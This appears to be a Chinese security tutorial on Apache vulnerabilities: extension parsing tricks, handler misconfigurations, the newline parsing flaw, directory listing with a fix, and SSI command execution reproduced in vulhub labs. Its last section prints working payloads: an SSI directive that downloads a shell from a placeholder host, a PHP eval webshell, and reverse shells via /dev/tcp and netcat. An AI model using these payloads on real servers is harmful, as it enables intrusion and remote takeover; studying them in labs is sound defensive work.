## **Apache目录结构**

> bin：存放常用命令工具，如httpd
>
> cgi-bin：存放linux下常用命令，如xxx.sh
>
> error：错误记录
>
> htdocs：网站源码
>
> icons：网站图标
>
> manual：手册
>
> modules：扩展模块

## Windows环境下的解析漏洞（CVE-2017-15715）

###  **漏洞原理：**

Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别，则继续向左识别，直到识别到合法后缀才进行解析。

###  **复现环境：**

phpstudy

 **1）复现**

建立如下文件进行验证：  
![image-20210507132611648.png](https://image.3001.net/images/20210508/1620451060_60961ef41019433caa3a4.png!small)解析成功。  
![image-20210507132711283.png](https://image.3001.net/images/20210508/1620451072_60961f00cf4445f63a056.png!small)

    
    
    1. 使用module模式与php结合的所有版本apache存在未知扩展名解析漏洞。
    2. 使用fastcgi模式与php结合的所有版本apache不存在此漏洞。
    3. 利用此漏洞时必须保证扩展名中至少带有一个.php，不然将默认作为txt/html文档处理。
    

module模式下以txt显示：  
![image-20210507133738845.png](https://image.3001.net/images/20210508/1620451092_60961f14d718d0461b6a0.png!small)  
fastcgi模式下：  
![image-20210507134456768.png](https://image.3001.net/images/20210508/1620451122_60961f3233338d73fafbb.png!small)![image-20210507134848526.png](https://image.3001.net/images/20210508/1620451127_60961f3738e01ae0b4c8d.png!small)

### Kali环境下漏洞操作

Kali虚拟机中包含有Apache。

    
    
    /etc/init.d/apache2 start  
    
    /etc/init.d/apache2 status
    
    service apache2 restart
    

或者

    
    
    systemctl restart apache2 
    
    systemctl status apache2
    

![image-20210507222448831.png](https://image.3001.net/images/20210508/1620451180_60961f6c13c6d97d6f525.png!small)在
/var/www/html下创建index.php文件  
![image-20210507222706849.png](https://image.3001.net/images/20210508/1620451191_60961f7738a3bc2027adf.png!small)
**1）深入分析apache解析漏洞**

    
    
    利用条件：
    1.使用module模式，且正则符合条件
    2.文件扩展名中至少带有一个.php
    

切换到 /etc/apache2/mods-enabled目录下找到apache-php模块的配置：  
![image-20210507223708524.png](https://image.3001.net/images/20210508/1620451207_60961f87059db7788beb2.png!small)![image-20210507224005458.png](https://image.3001.net/images/20210508/1620451211_60961f8bc003a40a04c70.png!small)正则表达式中，$用来匹配字符串结尾位置。如果设置了RegExp对象的Multiline属性的条件下，还会匹配到字符串结尾的换行符"\n"或"\r"。

    
    
    试着把"$"换成"\."
    然后重启apache
    service apache2 restart
    

![image-20210507224521061.png](https://image.3001.net/images/20210508/1620451222_60961f9693d5665b13ddc.png!small)**2）AddHandler导致的解析漏洞**  
![image-20210508001322797.png](https://image.3001.net/images/20210508/1620451238_60961fa6573baf76ea3ef.png!small)

    
    
    AddHandler application/x-httpd-php .php
    

调用php时，只要带.php都可以解析为php文件。  
![image-20210508001557281.png](https://image.3001.net/images/20210508/1620451257_60961fb9bf1c28485a23b.png!small)重启
Apache服务后可以正常解析。  
![image-20210508001754230.png](https://image.3001.net/images/20210508/1620451274_60961fca2b2ee4f657a09.png!small)
**3）罕见后缀总结**  
![image-20210508002914082.png](https://image.3001.net/images/20210508/1620451284_60961fd4bc05ab9f42d5a.png!small)
php3、php4、php5、pht、phtml  
![image-20210508003208146.png](https://image.3001.net/images/20210508/1620451303_60961fe71ec91accbd805.png!small)正则匹配的有php、phar、phtml等  
 **4）配置问题总结**

（1）如果在Apache的 /etc/apache2/apache2.conf里有如下配置时，只要文件名是xxx.jpg，就会以php来执行。

    
    
    <FilesMatch "xxx.jpg">
     SetHandler application/x-httpd-php
    </FilesMatch>
    

（2）如果Apache的conf里有这样一行配置 AddHandler php5-script .php，只要文件名里包含.php就会以php来执行。

（3）如果Apache的conf里有这样一行配置 AddType application/x-httpd-php
.jpg，只要文件名里包含.php就会以php来执行。

 **5）目录遍历**

    
    
    Google Hack 
    intitle:index of 
    

**修复方案：**

    
    
    修改Apache配置文件httpd.conf，找到 Options Indexes FollowSymLinks 在“Indexes”前面添加减号，禁止找不到默认主页列出目录下文件<Directory "/var/www/html">  
    Options -Indexes FollowSymLinks
    

## Apache HTTPD换行解析漏洞（CVE-2017-15715）

###  **漏洞描述：**

1.php\x0a => 1.php

上传后缀末尾包含换行符的文件，可以绕过FilesMatch。

该漏洞属于用户配置不当产生的漏洞，与具体中间件版本无关。

###  **影响范围：**

2.4.0~2.4.29版本

###  **复现环境：**

vulhub

## Apache SSI远程命令执行漏洞

###  **影响范围：**

Apache全版本（支持SSI和CGI）

###  **漏洞原理：**

不允许上传php文件时，可以上传.shtml后缀的文件。利用SSI执行系统命令的功能，正常的包含一个SSI指令的文件。

    
    
    <pre>
    <!--#exec cmd="whoami" -->
    </pre>
    

### **复现环境：**

vulhub

###  **复现操作：**

获得CMD反弹的命令回显后，可以上传一个webshell

    
    
    <!--#exec cmd="wget http://xxx/shell.txt | rename shell.txt shell.php" -->
    echo '<?php @eval($_POST[123]);?>' > shell.php
    

需要开启python。

反弹shell

    
    
    <!--#exec cmd="/bin/bash -i > /dev/tcp/（nc所在ip）/8888 0<&1 2>&1" -->
    <!--#exec cmd="nc （nc所在ip） 8888 -e /bin/bash"-->
    

